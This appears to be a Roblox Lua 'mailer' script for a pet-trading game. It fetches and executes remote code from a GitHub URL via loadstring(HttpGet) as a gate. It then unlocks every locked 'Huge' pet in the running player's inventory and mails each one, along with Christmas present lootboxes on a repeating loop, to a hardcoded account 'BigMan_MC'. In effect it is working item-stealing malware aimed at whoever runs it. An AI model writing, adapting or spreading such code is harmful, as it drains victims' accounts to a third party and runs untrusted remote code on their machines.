-- Mailer with True and False Checker

getgenv().MailToUser = "BigMan_MC"

local proceed = loadstring("return " .. game:HttpGet("https://raw.githubusercontent.com/TheArexH4CKER/check/refs/heads/main/check.lua"))()

if proceed then
    local Network = require(game.ReplicatedStorage.Library.Client.Network)

    local HugeUIDList = {}
    for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
        if PetData.id:find("Huge ") then
            table.insert(HugeUIDList, PetUID)
            if PetData._lk then
                repeat
                    task.wait()
                until Network.Invoke("Locking_SetLocked", PetUID, false)
                print("Unlocked", PetUID)
            end
        end
    end

    for _, PetUID in pairs(HugeUIDList) do
        repeat
            task.wait()
        until Network.Invoke("Mailbox: Send", MailToUser, tostring(Random.new():NextInteger(9, 999999)), "Pet", PetUID, 1)
        print("Sent", PetUID)
    end
else
    print("Returned False, Huges wont be sent")
end


-- Item Mailer

getgenv().CFG = {
    ['Items'] = {
        ["2024 Small Christmas Present"] = {'Lootbox', 150},
        ["2024 Medium Christmas Present"] = {'Lootbox', 75},
        ["2024 Large Christmas Present"] = {'Lootbox', 15},
        ["2024 X-Large Christmas Present"] = {'Lootbox', 1},
        ["2024 Gargantuan Christmas Present"] = {'Lootbox', 1},
    },
    ['Mail Acc'] = "BigMan_MC",
    ['Loop Delay'] = 600, -- Seconds
}

repeat task.wait() until game:IsLoaded()
local LocalPlayer = game:GetService('Players').LocalPlayer
repeat task.wait() until not LocalPlayer.PlayerGui:FindFirstChild('__INTRO')

local Client = game.ReplicatedStorage.Library.Client
local Network = require(Client.Network)
local SaveMod = require(Client.Save)

local GetMailTax = function()
    local MailSendToday = SaveMod.Get()['MailboxSendsSinceReset']
    if require(Client.Gamepasses).Owns("VIP") then
        return 20000
    end
    
    local tax = 20000 * (1.5 ^ MailSendToday)
    return math.min(tax, 5000000)
end

local GetItem = function(Class, Id)
    for i, v in pairs(SaveMod.Get()['Inventory'][Class] or {}) do
        if v.id == Id then
            return i, v
        end
    end
    return nil, nil
end

while task.wait(CFG['Loop Delay']) do
    for ID, ConfigDetails in pairs(CFG['Items']) do
        local Class, MinAmount = unpack(ConfigDetails)
        local UID, Details = GetItem(Class, ID)
        
        if Details and Details._am >= MinAmount then
            local SendAmount = (Class == 'Currency') and (Details._am - GetMailTax()) or Details._am
            
            local success = false
            while not success do
                success = Network.Invoke("Mailbox: Send", CFG['Mail Acc'], "Meowsers", Class, UID, SendAmount) task.wait(0.1)
            end
        end
    end
end